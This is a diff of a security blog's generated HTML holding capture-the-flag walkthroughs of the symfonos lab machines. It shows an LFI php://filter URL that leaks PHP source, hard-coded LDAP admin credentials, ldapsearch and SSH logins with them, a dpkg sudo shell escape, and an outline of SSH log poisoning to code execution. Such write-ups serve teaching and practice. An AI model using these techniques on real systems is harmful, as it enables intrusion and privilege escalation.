+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">} else {
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> Login
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
 &lt;h1 id="getting-shell-as-zeus">Getting shell as zeus&lt;/h1>
 &lt;p>With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>From the output, the userPassword is base64 encoded. After decoding it we get &lt;code>cetkKf4wCuHC9FET&lt;/code> and can login
 as zeus via ssh.&lt;/p>
@@ -215,9 +235,9 @@ as zeus via ssh.&lt;/p>
 &lt;p>From &lt;a href="https://gtfobins.github.io/gtfobins/dpkg/" target="_blank" rel="noopener">gtfobins&lt;/a>
 we only need to execute the below commands to
 abuse this.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo dpkg -l
-!/bin/bash
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo dpkg -l
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>!/bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h1 id="extras">Extras&lt;/h1>
 &lt;p>When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
@@ -246,26 +266,27 @@ we exploit the lfi. For that we poison ssh logs for exploitation to rce. For pri
 a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
